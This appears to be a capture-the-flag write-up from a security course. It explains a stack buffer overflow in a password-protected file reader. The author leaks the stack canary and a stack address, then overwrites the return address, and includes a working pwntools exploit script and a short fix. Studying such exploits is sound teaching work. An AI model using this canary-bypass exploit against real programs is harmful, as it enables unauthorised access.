Challenge Name
==============

Overview
--------
The given program tried to protect a file by revealing its content only if the caller provided the correct password for it.

Vulnerability
-------------
To compare the hashed password with the saved hash the programm allocates a buffer for the user input and offeres three tries to enter it. While reading form sdtin it loops until a limit ```MAX_P_LEN``` with unknown size is met or the character read is a newline character. This limit is larger than the size of the buffer which can be abused for a buffer overflow attack.  
However there is a canary protection mechanism in place which enables detection of such attacks and aborts the program in that case. In this case this didn't stop us from still breaking it because of the calls to ```fflush(stdout)``` and the subsequent calls to ```printf(...)```.

Exploitation
------------
To subvert the program I first played around with it in gdb and looked at the diasembled main and check functions to see what I could do. I noticed that after the call to check in main a jump if equal instruction was made on the return value of check and something else. Inspecting the stack frame of check I found a value that was just a little higher than the address of the jump instruction. This had to be the return address that I could modify to bypass the check and make the program open the file without providing a valid password.  
Next I had to solve reading out the canary at runtime since a few runthroughs and stack inspections in gdb showed me that it was dynamically generated. There was a pattern in it though, its least significant byte was always ```\0``` so overwriting it with a ```\n``` would make the program output the rest of the word wich I would read for to insert into my payload.  
When this succeeded I ran into another problem, the program showed me the message ```LOGGED IN!``` but there was no flag and it segfaulted. I took this as an indicator that there was another value in the stack which I replaced with a value from gdb that was an address and differed when ran outside of the debugger. I read the values between the canary and the return address at runtime just like I did with the canary overwriting the least significant byte (which was the one that differed) because it didn't occur to me that I only had to do this because of the leading ```\0``` in the canary. Since I didn't find the differing word I thougth my assumption was wrong and spent hours trying different things going almost insane... Since I ran out of ideas I contacted someone who I knew of had the same problem (correct message but no flag) like me, bernikir, in the fsinf mattermost Introduction to Security channel to verify that my assumptions were right. He told me that I should just try to not overwrite the least significant byte of the word I was trying to read which worked out perfectly well and fixed my exploit to hand me the flag.  
This is my exploit:  
```python
#!/usr/bin/python
from __future__ import print_function
import sys
from pwn import *


def main():
    responses = []

    p = process(sys.argv[1])

    p.sendline('A'*32)
    responses.append(p.recvline())
    canary = '\x00' + p.recv(3)

    p.sendline('A'*43)
    responses.append(p.recvline())
    stack_addr = p.recv(4)
 
    payload = 'A'*32 + canary + p32(0xf7dd03fc) + p32(0x0804a000) + stack_addr + p32(0x08048831)

    p.sendline(payload)
    responses.append(p.recvall())

    print()
    pretty_print('canary', canary)
    pretty_print('stack address', stack_addr)
    pretty_print('payload', payload)

    for res in responses:
        print(res, end='')

def pretty_print(tag, value):
    print("%s : %d %s %s" % (tag, len(value), value.encode('hex'), value))

if __name__ == '__main__':
    main()
```


Solution
--------
The size of ```MAX_P_LEN``` should be equal to then size of the buffer - 1.
